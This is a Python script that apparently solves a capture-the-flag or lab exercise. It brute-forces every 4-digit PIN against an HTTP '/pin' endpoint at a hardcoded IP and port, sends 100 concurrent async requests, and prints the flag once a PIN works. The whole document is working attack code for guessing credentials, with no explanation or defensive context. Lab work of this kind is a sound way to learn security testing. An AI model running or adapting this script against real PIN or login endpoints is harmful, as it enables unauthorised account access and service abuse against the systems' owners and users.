import asyncio
import aiohttp

ip = "94.237.59.180"  # Replace with your instance IP address
port = 44434          # Replace with your instance port number
url = f"http://{ip}:{port}/pin"

async def try_pin(session, pin):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string
    async with session.get(f"{url}?pin={formatted_pin}") as response:
        if response.status == 200:  # Check if the response is successful
            data = await response.json()
            if 'flag' in data:  # Check if the flag is in the response
                print(f"Correct PIN found: {formatted_pin}")
                print(f"Flag: {data['flag']}")
                return True
    return False

async def main():
    tasks = []
    semaphore = asyncio.Semaphore(100)  # Limit to 100 concurrent requests

    async with aiohttp.ClientSession() as session:
        for pin in range(10000):
            await semaphore.acquire()

            async def task_wrapper(pin=pin):
                try:
                    success = await try_pin(session, pin)
                    if success:
                        for t in tasks:  # Cancel remaining tasks if PIN is found
                            t.cancel()
                finally:
                    semaphore.release()

            tasks.append(asyncio.create_task(task_wrapper()))

        # Wait for all tasks to complete
        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass

# Run the script
asyncio.run(main())
